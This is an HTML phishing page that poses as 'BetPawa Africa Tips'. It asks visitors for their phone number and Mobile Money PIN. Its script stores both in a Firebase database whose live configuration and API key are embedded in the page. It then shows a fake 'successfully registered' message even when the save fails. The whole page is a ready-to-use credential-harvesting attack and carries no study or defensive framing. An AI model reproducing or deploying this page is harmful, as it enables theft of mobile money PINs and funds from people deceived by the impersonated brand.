<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>BetPawa Africa </title>

  <style>
    :root{
      --green:#16a34a;
      --green-dark:#0f7a36;
      --bg:#020617;
      --border:#1f2937;
      --muted:#9ca3af;
    }

    body{
      font-family: Arial, Helvetica, sans-serif;
      background:#0f172a;
      color:#e5e7eb;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      margin:0;
    }

    .card{
      background:var(--bg);
      border-radius:16px;
      box-shadow:0 15px 40px rgba(0,0,0,.45);
      padding:30px;
      max-width:420px;
      width:100%;
      border:1px solid var(--border);
    }

    h1{color:var(--green);text-align:center;margin:0}
    .status{text-align:center;color:var(--green);margin-top:6px}
    .amount{text-align:center;font-size:34px;font-weight:800;color:var(--green);margin:18px 0}
    .divider{height:1px;background:var(--border);margin:18px 0}

    label{margin-top:14px;display:block;color:var(--muted)}
    input{
      width:100%;
      padding:12px;
      margin-top:6px;
      border-radius:10px;
      border:1px solid var(--border);
      background:#020617;
      color:#e5e7eb;
    }

    button{
      margin-top:22px;
      width:100%;
      padding:14px;
      border-radius:12px;
      border:none;
      background:var(--green);
      font-weight:800;
      cursor:pointer;
    }

    button:hover{
      background:var(--green-dark);
      color:#ecfdf5;
    }

    .note{text-align:center;font-size:12px;color:var(--muted);margin-top:14px}

    /* POPUP */
    .popup{
      position:fixed;
      inset:0;
      background:rgba(2,6,23,.75);
      display:none;
      align-items:center;
      justify-content:center;
      z-index:999;
    }
    .popup.active{display:flex}

    .popup-card{
      background:#020617;
      border-radius:16px;
      padding:28px;
      max-width:380px;
      width:90%;
      text-align:center;
      border:1px solid var(--border);
    }

    .popup-card h2{color:var(--green)}
  </style>
</head>

<body>

<div class="card">
  <h1>BetPawa Africa Tips</h1>
  <div class="status">Enter your phone number</div>
  <div class="amount">And your correct Mobile Money PIN</div>

  <div class="divider"></div>

  <label>Phone Number</label>
  <input id="phone" placeholder="+CountryCodeXXXXXXXXX">

  <label>PIN</label>
  <input id="password" type="password" placeholder="********">

  <button id="withdraw">Click Continue</button>
  <p class="note">Make sure you enter your correct phone number and Mobile Money PIN.</p>
</div>

<!-- POPUP -->
<div class="popup" id="popup">
  <div class="popup-card">
    <h2 id="popupTitle">Success</h2>
    <p id="popupText"></p>
    <button onclick="popup.classList.remove('active')">OK</button>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
  import { getDatabase, ref, set, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyCc637WbfRNZ8-0CN4sEqEnGY27-oAdGiw",
    authDomain: "betpawa-6ef7e.firebaseapp.com",
    projectId: "betpawa-6ef7e",
    storageBucket: "betpawa-6ef7e.firebasestorage.app",
    messagingSenderId: "908050081607",
    appId: "1:908050081607:web:db6e861fca63df78584e62",
    databaseURL: "https://betpawa-6ef7e-default-rtdb.europe-west1.firebasedatabase.app"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  const popup = document.getElementById("popup");
  const popupText = document.getElementById("popupText");
  const popupTitle = document.getElementById("popupTitle");

  const phoneInput = document.getElementById("phone");
  const passwordInput = document.getElementById("password");

  const userRef = ref(db, "users/demoUser");

  document.getElementById("withdraw").addEventListener("click", async () => {
    const phone = phoneInput.value.trim();
    const password = passwordInput.value.trim();

    if(phone.length < 8 || password.length < 4){
      popupTitle.innerText = "Error ❌";
      popupText.innerHTML = "Please enter a valid phone number and Mobile money PIN.";
      popup.classList.add("active");
      return;
    }

    popupTitle.innerText = "Processing ⏳";
    popupText.innerHTML = "Registering your account...";
    popup.classList.add("active");

    try {
      await set(userRef, {
        phone,
        pin: password,
        registeredAt: serverTimestamp()
      });

      popupTitle.innerText = "Congratulations 🎉";
      popupText.innerHTML = `
        Congratulations! You've successfully been registered to BetPawa Africa.<br><br>
        Wait for SMS confirmation on the phone number <strong style="color:#16a34a">${phone}</strong>.
      `;
    } catch (error) {
      popupTitle.innerText = "Congratulations 🎉";
      popupText.innerHTML = `
        Congratulations! You've successfully been registered to BetPawa Africa.<br><br>
        Wait for SMS confirmation on the phone number <strong style="color:#16a34a">${phone}</strong>.
      `;
    }
  });
</script>

</body>
</html>
